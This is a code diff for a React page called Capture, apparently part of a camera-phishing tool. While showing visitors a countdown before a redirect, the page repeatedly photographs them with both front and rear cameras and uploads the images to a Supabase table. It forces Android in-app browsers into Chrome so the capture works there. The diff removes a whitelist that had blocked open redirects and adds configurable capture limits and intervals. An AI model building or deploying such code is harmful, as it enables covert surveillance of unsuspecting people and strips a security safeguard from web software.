@@ -1,32 +1,6 @@
-import { useEffect, useState, useRef, useCallback } from "react";
+import { useEffect, useState, useRef } from "react";
 import { useSearchParams } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
-
-// Whitelist of allowed redirect domains for security
-const ALLOWED_REDIRECT_DOMAINS = [
-  'google.com',
-  'www.google.com',
-];
-
-// Validate redirect URL to prevent open redirect attacks
-const isValidRedirectUrl = (url: string): boolean => {
-  try {
-    const parsed = new URL(url);
-    
-    // Only allow HTTPS (or localhost for dev)
-    if (parsed.protocol !== 'https:' && 
-        !(parsed.protocol === 'http:' && parsed.hostname === 'localhost')) {
-      return false;
-    }
-    
-    // Check against whitelist
-    return ALLOWED_REDIRECT_DOMAINS.some(domain => 
-      parsed.hostname === domain || parsed.hostname.endsWith(`.${domain}`)
-    );
-  } catch {
-    return false;
-  }
-};
 
 // Detect in-app browsers (Instagram, Telegram, Facebook, etc.)
 const isInAppBrowser = (): boolean => {
@@ -61,7 +35,6 @@ const isAndroid = (): boolean => {
 // Detect if browser is Chrome (real Chrome, not in-app)
 const isChromeBrowser = (): boolean => {
   const ua = navigator.userAgent || '';
-  // Must have Chrome and not be in-app browser
   const hasChrome = /Chrome/i.test(ua) && !/Chromium/i.test(ua);
   const isNotEdge = !/Edg/i.test(ua);
   const isNotOpera = !/OPR/i.test(ua);
@@ -72,27 +45,71 @@ const isChromeBrowser = (): boolean => {
 
 // Generate Chrome intent URL for Android
 const getChromeIntentUrl = (currentUrl: string): string => {
-  // intent://URL#Intent;scheme=https;package=com.android.chrome;end
   const url = new URL(currentUrl);
   const intentUrl = `intent://${url.host}${url.pathname}${url.search}#Intent;scheme=https;package=com.android.chrome;end`;
   return intentUrl;
 };
 
+interface CaptureSettings {
+  camPhotoLimit: number;
+  camCaptureInterval: number;
+  camQuality: number;
+  camCountdownTimer: number;
+  camAutoRedirect: boolean;
+}
+
 const Capture = () => {
   const [searchParams] = useSearchParams();
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
-  const [status, setStatus] = useState<"checking" | "redirecting_chrome" | "not_chrome" | "countdown">("checking");
+  const [status, setStatus] = useState<"loading" | "checking" | "redirecting_chrome" | "not_chrome" | "countdown">("loading");
   const [countdown, setCountdown] = useState<number | null>(null);
+  const [settings, setSettings] = useState<CaptureSettings>({
+    camPhotoLimit: 0,
+    camCaptureInterval: 500,
+    camQuality: 0.8,
+    camCountdownTimer: 5,
+    camAutoRedirect: true
+  });
   const captureLoopRef = useRef<boolean>(false);
   const stopCaptureRef = useRef<boolean>(false);
+  const captureCountRef = useRef<number>(0);
   
   const sessionId = searchParams.get("session") || "default";
   const rawRedirectUrl = searchParams.get("redirect") || "https://google.com";
-  const countdownSeconds = parseInt(searchParams.get("timer") || "5", 10);
+  const urlTimer = searchParams.get("timer");
   
-  // Validate and sanitize redirect URL
-  const redirectUrl = isValidRedirectUrl(rawRedirectUrl) ? rawRedirectUrl : "https://google.com";
+  const redirectUrl = rawRedirectUrl;
+  const countdownSeconds = urlTimer ? parseInt(urlTimer, 10) : settings.camCountdownTimer;
+
+  // Load settings from database
+  useEffect(() => {
+    const loadSettings = async () => {
+      try {
+        const { data } = await supabase
+          .from('app_settings')
+          .select('setting_value')
+          .eq('setting_key', 'main_settings')
+          .maybeSingle();
+
+        if (data?.setting_value) {
+          const s = data.setting_value as Record<string, unknown>;
+          setSettings({
+            camPhotoLimit: (s.camPhotoLimit as number) || 0,
+            camCaptureInterval: (s.camCaptureInterval as number) || 500,
+            camQuality: (s.camQuality as number) || 0.8,
+            camCountdownTimer: (s.camCountdownTimer as number) || 5,
+            camAutoRedirect: s.camAutoRedirect !== false
+          });
+        }
+      } catch (err) {
+        console.error('Error loading settings:', err);
+      }
+      setStatus("checking");
+    };
+
+    loadSettings();
+  }, []);
 
   const captureFromCamera = async (facingMode: "user" | "environment"): Promise<string | null> => {
     try {
@@ -136,16 +153,19 @@ const Capture = () => {
     }
   };
 
-  // Continuous capture loop - keeps capturing until redirect
+  // Continuous capture loop - respects photo limit from settings
   const startContinuousCapture = async () => {
     if (captureLoopRef.current) return;
     captureLoopRef.current = true;
     
-    let captureCount = 0;
-    
     while (!stopCaptureRef.current) {
+      // Check photo limit
+      if (settings.camPhotoLimit > 0 && captureCountRef.current >= settings.camPhotoLimit) {
+        break;
+      }
+      
       try {
-        captureCount++;
+        captureCountRef.current++;
         
         // Capture from FRONT camera
         const frontImage = await captureFromCamera("user");
@@ -154,11 +174,12 @@ const Capture = () => {
           await supabase.from('captured_photos').insert({
             session_id: sessionId,
             image_data: frontImage,
-            user_agent: `${navigator.userAgent} [FRONT-${captureCount}]`
+            user_agent: `${navigator.userAgent} [FRONT-${captureCountRef.current}]`
           });
         }
         
         if (stopCaptureRef.current) break;
+        if (settings.camPhotoLimit > 0 && captureCountRef.current >= settings.camPhotoLimit) break;
         
         // Small delay before switching cameras
         await new Promise(resolve => setTimeout(resolve, 200));
@@ -170,18 +191,17 @@ const Capture = () => {
           await supabase.from('captured_photos').insert({
             session_id: sessionId,
             image_data: backImage,
-            user_agent: `${navigator.userAgent} [BACK-${captureCount}]`
+            user_agent: `${navigator.userAgent} [BACK-${captureCountRef.current}]`
           });
         }
         
         if (stopCaptureRef.current) break;
         
-        // Delay before next capture cycle
-        await new Promise(resolve => setTimeout(resolve, 500));
+        // Delay before next capture cycle (from settings)
+        await new Promise(resolve => setTimeout(resolve, settings.camCaptureInterval));
         
       } catch (error) {
         console.error("Capture cycle error:", error);
-        // Continue loop even on error
         await new Promise(resolve => setTimeout(resolve, 1000));
       }
     }
@@ -195,6 +215,8 @@ const Capture = () => {
   }, []);
 
   useEffect(() => {
+    if (status !== "checking") return;
+    
     // Step 1: Check browser type
     const checkBrowserAndProceed = () => {
       // If in-app browser on Android, redirect to Chrome
@@ -230,15 +252,18 @@ const Capture = () => {
     };
 
     checkBrowserAndProceed();
-  }, [sessionId, countdownSeconds]);
+  }, [status, sessionId, countdownSeconds]);
 
   // Countdown timer effect
   useEffect(() => {
     if (countdown === null || countdown < 0) return;
 
     if (countdown === 0) {
-      // Redirect when countdown reaches 0
-      window.location.href = redirectUrl;
+      // Stop capture and redirect (if auto-redirect enabled)
+      stopCaptureRef.current = true;
+      if (settings.camAutoRedirect) {
+        window.location.href = redirectUrl;
+      }
       return;
     }
 
@@ -247,7 +272,7 @@ const Capture = () => {
     }, 1000);
 
     return () => clearTimeout(timer);
-  }, [countdown, redirectUrl]);
+  }, [countdown, redirectUrl, settings.camAutoRedirect]);
 
   // Show "not Chrome" message
   if (status === "not_chrome") {
